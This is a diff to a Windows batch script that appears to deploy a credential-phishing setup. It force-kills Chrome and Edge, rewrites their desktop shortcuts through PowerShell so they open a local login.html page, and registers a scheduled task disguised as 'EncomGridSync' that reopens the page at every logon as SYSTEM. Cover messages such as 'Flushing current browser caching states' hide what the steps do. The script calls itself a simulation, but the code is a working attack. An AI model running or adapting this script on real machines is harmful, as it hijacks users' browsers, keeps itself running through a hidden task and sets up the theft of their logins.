@@ -54,7 +54,14 @@ echo ^</html^>
 ) > "%WEB_PATH%"
 
 :: ----------------------------------------------------
-:: STEP 2: Hijack Desktop Shortcuts via PowerShell
+:: STEP 2: Force-Kill Active Browser Background Tasks
+:: ----------------------------------------------------
+echo [+] Flushing current browser caching states...
+taskkill /f /im chrome.exe >nul 2>&1
+taskkill /f /im msedge.exe >nul 2>&1
+
+:: ----------------------------------------------------
+:: STEP 3: Hijack Desktop Shortcuts via PowerShell
 :: ----------------------------------------------------
 echo [+] Modifying User Desktop Application Shortcuts...
 
@@ -62,7 +69,7 @@ powershell -NoProfile -Command ^
     "$Shell = New-Object -ComObject WScript.Shell; " ^
     "$UserDesktop = [Environment]::GetFolderPath('Desktop'); " ^
     "$PublicDesktop = [Environment]::GetFolderPath('PublicDesktop'); " ^
-    "function Hijack-Shortcut($Name, $Binary, $Args) { " ^
+    "function Hijack-Shortcut($Name, $Args) { " ^
     "   $Paths = @([System.IO.Path]::Combine($UserDesktop, $Name), [System.IO.Path]::Combine($PublicDesktop, $Name)); " ^
     "   foreach ($Path in $Paths) { " ^
     "       if (Test-Path $Path) { " ^
@@ -74,16 +81,15 @@ powershell -NoProfile -Command ^
     "       } " ^
     "   } " ^
     "}; " ^
-    "Hijack-Shortcut 'Google Chrome.lnk' 'chrome.exe' '/c start chrome.exe file:///C:/Users/Public/Documents/login.html'; " ^
-    "Hijack-Shortcut 'Microsoft Edge.lnk' 'msedge.exe' '/c start msedge.exe file:///C:/Users/Public/Documents/login.html';"
+    "Hijack-Shortcut 'Google Chrome.lnk' '/c start \"\" \"C:\Program Files\Google\Chrome\Application\chrome.exe\" --new-window \"C:\Users\Public\Documents\login.html\"'; " ^
+    "Hijack-Shortcut 'Microsoft Edge.lnk' '/c start \"\" \"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe\" --new-window \"C:\Users\Public\Documents\login.html\"';"
 
 :: ----------------------------------------------------
-:: STEP 3: Register Persistence via Scheduled Task
+:: STEP 4: Register Persistence via Scheduled Task
 :: ----------------------------------------------------
 echo [+] Setting up persistent system configuration...
 
-:: Update the scheduled task to use chrome instead of edge
-schtasks /create /tn "EncomGridSync" /tr "cmd.exe /c start chrome.exe file:///C:/Users/Public/Documents/login.html" /sc onlogon /ru "SYSTEM" /f >nul 2>&1
+schtasks /create /tn "EncomGridSync" /tr "cmd.exe /c start chrome.exe --new-window \"C:\Users\Public\Documents\login.html\"" /sc onlogon /ru "SYSTEM" /f >nul 2>&1
 
 if %errorlevel% equ 0 (
     echo     - Scheduled task 'EncomGridSync' registered successfully.
@@ -92,5 +98,5 @@ if %errorlevel% equ 0 (
 )
 
 echo.
-echo [+] Execution block complete. Simulation assets deployed.
+echo [+] Execution block complete. Simulation assets deployed successfully.
 pause
